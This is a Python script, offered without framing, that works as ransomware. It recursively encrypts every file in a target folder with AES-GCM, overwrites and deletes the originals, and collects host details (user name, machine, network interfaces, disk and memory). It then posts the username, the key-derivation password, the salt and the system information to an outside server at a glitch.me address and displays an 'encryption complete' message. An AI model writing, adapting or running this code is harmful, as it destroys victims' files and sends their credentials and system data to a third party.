import os
import secrets
import threading
import getpass
import hashlib
import tkinter as tk
from tkinter import messagebox
import requests
import uuid
import platform
import time
import json
import psutil
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

SERVER_URL = 'https://respected-spiced-bobolink.glitch.me/store_data'

def get_mac_address():
    """Get the system's MAC address."""
    mac = uuid.getnode()
    return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))

def get_system_uuid():
    """Get a stable identifier for the system."""
    return str(uuid.getnode())

def generate_user_specific_password_and_salt():
    """Generate a unique password and salt using fixed system identifiers."""
    user = getpass.getuser()
    mac_address = get_mac_address()
    system_uuid = get_system_uuid()

    unique_string = f"{user}-{mac_address}-{system_uuid}-constant_value"
    password = hashlib.sha256(unique_string.encode()).digest()
    salt = password[:16]  # First 16 bytes of the hash as salt
    return password, salt

def load_encryption_details():
    """Load encryption details (password and salt) from local file."""
    if os.path.exists('encryption_details.txt'):
        with open('encryption_details.txt', 'r') as f:
            lines = f.readlines()
            password = bytes.fromhex(lines[0].split(': ')[1].strip())
            salt = bytes.fromhex(lines[1].split(': ')[1].strip())
            return password, salt
    return None, None

def save_encryption_details(password, salt):
    """Save encryption details (password and salt) locally."""
    with open('encryption_details.txt', 'w') as f:
        f.write(f'Password: {password.hex()}\n')
        f.write(f'Salt: {salt.hex()}\n')

def derive_key(password: bytes, salt: bytes) -> bytes:
    """Derives a key from a password using PBKDF2 and returns the key."""
    try:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            iterations=100000,
            length=32,
            salt=salt,
            backend=default_backend()
        )
        return kdf.derive(password)
    except Exception as e:
        print(f"Key derivation failed: {e}")
        raise

def generate_key():
    """Generate a random 32-byte (256-bit) key."""
    return secrets.token_bytes(32)

def encrypt_file(key, file_path):
    """Encrypt a file using AES-GCM."""
    if file_path.endswith('.enc'):
        print(f"Skipping already encrypted file: {file_path}")
        return

    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    try:
        with open(file_path, 'rb') as file:
            plaintext = file.read()
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()

        encrypted_file_path = file_path + '.enc'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(iv + encryptor.tag + ciphertext)

        secure_file_delete(file_path)
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def secure_file_delete(file_path):
    """Securely delete a file by overwriting it with random data."""
    try:
        with open(file_path, 'r+b') as file:
            file_size = os.path.getsize(file_path)
            file.write(os.urandom(file_size))
        os.remove(file_path)
    except Exception as e:
        print(f"Error deleting {file_path}: {e}")

def encrypt_data(key, data):
    """Encrypt data using AES-GCM."""
    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    encrypted_data = encryptor.update(data) + encryptor.finalize()

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return iv + encryptor.tag + encrypted_key + encrypted_data

def save_key(master_key, key_to_encrypt, key_path):
    """Save an encrypted key securely using RSA."""
    encrypted_key = encrypt_data(master_key, key_to_encrypt)

    with open(key_path, 'wb') as key_file:
        key_file.write(encrypted_key)

def get_system_info():
    """Gather system information."""
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "User Name": getpass.getuser(),
        "Home Directory": os.path.expanduser("~"),
        "CPU Count": psutil.cpu_count(),
        "CPU Usage": psutil.cpu_percent(interval=1),
        "Total Memory": round(psutil.virtual_memory().total / (1024 * 1024), 2),
        "Available Memory": round(psutil.virtual_memory().available / (1024 * 1024), 2),
        "Total Disk Space": round(psutil.disk_usage('/').total / (1024 * 1024 * 1024), 2),
        "Used Disk Space": round(psutil.disk_usage('/').used / (1024 * 1024 * 1024), 2),
        "Free Disk Space": round(psutil.disk_usage('/').free / (1024 * 1024 * 1024), 2),
        "Network Interfaces": {interface: [addr.address for addr in details] for interface, details in psutil.net_if_addrs().items()},
    }
    
    # Windows does not support os.getuid() and os.getgid()
    if platform.system() != "Windows":
        system_info["User ID"] = os.getuid()
        system_info["Group ID"] = os.getgid()

    return system_info

def encrypt_all_data(key, data_source):
    """Encrypt all files in a specified directory using multi-threading."""
    threads = []
    processed_files = set()
    for root, dirs, files in os.walk(data_source):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if file_path in processed_files:
                continue

            thread = threading.Thread(target=encrypt_file, args=(key, file_path))
            thread.start()
            threads.append(thread)
            processed_files.add(file_path)

    for thread in threads:
        thread.join()

def send_data_to_server(username, password, salt, system_info, max_retries=5):
    """Send user data to the server with retries on failure."""
    data = {
        'username': username,
        'password': password.hex(),
        'salt': salt.hex(),
        'system_info': system_info
    }
    
    for attempt in range(max_retries):
        try:
            response = requests.post(SERVER_URL, json=data)
            print("Server response:", response.json())
            if response.status_code == 200:
                print("Data sent successfully to the server.")
                return
            else:
                print(f"Failed to send data (attempt {attempt + 1}). Server responded with: {response.status_code}, {response.text}")
        
        except requests.ConnectionError:
            print(f"Connection error (attempt {attempt + 1}). Retrying...")
        
        except requests.Timeout:
            print(f"Request timed out (attempt {attempt + 1}). Retrying...")
        
        except Exception as e:
            print(f"An error occurred while sending data (attempt {attempt + 1}): {e}")
        
        time.sleep(3)

    print("Failed to send data after multiple attempts.")
    
def display_decryption_key(key):
    """Display the decryption key for the user."""
    print("\nDecryption Key:")
    print(key.hex())
    print("\nIMPORTANT: Save this key securely for future decryption!")

def show_notification(message):
    """Show a notification message box."""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Encryption Complete", message)
    root.destroy()

def main():
    home_directory = os.path.expanduser("~")
    path = r"C:\Users\USER\Documents\Shaykhul\RockyRabbit\New folder"

    # Load existing password and salt or generate new ones
    password, salt = load_encryption_details()
    if password is None or salt is None:
        password, salt = generate_user_specific_password_and_salt()
        save_encryption_details(password, salt)

    key = derive_key(password, salt)

    # Get the current username and system information
    username = getpass.getuser()
    system_info = get_system_info()

    encrypted_key_path = os.path.join(home_directory, 'encrypted_key.bin')
    master_key = generate_key()
    save_key(master_key, key, encrypted_key_path)

    encrypt_all_data(key, path)
    
    # Send password, salt, and system information to the server
    send_data_to_server(username, password, salt, system_info)

    sample_data = b"This is some sample data to be encrypted."
    encrypted_data = encrypt_data(key, sample_data)

    with open('encrypted_data.bin', 'wb') as encrypted_data_file:
        encrypted_data_file.write(encrypted_data)

    display_decryption_key(key)
    
    # Show notification after encryption is complete
    show_notification("All files have been encrypted successfully!")

if __name__ == "__main__":
    main()

